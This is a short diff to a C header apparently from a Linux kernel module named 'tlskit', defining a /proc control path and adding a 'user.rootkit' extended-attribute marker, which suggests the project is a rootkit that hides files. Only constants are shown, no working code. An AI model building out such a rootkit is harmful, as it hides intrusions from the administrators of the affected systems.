@@ -19,5 +19,6 @@
 #define PROC_ENTRY_NAME "tlskit"
 #define IOCTL_FILE_PATH "/proc/tlskit"
 #define MODULE_NAME     "tlskit"
+#define HIDDEN_XATTR    "user.rootkit"
 
 #endif //LKM_TLSKIT_SHARED_H
